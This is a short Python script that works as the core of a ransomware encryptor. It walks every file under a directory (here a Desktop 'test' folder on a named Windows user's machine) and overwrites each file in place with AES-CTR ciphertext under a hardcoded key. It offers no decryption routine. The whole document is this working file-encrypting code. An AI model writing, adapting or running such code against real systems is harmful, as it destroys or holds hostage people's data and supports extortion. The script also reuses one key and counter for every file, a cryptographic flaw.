from Crypto import Random
from Crypto.Cipher import AES
import os
import os.path
from Crypto.Util import Counter

key = b'\xab\xe6\x7f\xd1\xce\xae\xd5\xe8\xbc\x0b\x1a\x93\xca\x8a\xca/'

def encrypt(fullpath, key):
    # encryption
    counter = Counter.new(128)
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)
    with open(fullpath, 'r+b') as f:
        plaintext = f.read(16)
        while plaintext:
            f.seek(-len(plaintext), 1)
            f.write(cipher.encrypt(plaintext))
            plaintext = f.read(16)

for dir, subdir, files in os.walk(r'C:\Users\GAMALELDIN\Desktop\test'):
    for file in files:
        fullpath = os.path.join(dir, file)
        encrypt(fullpath, key)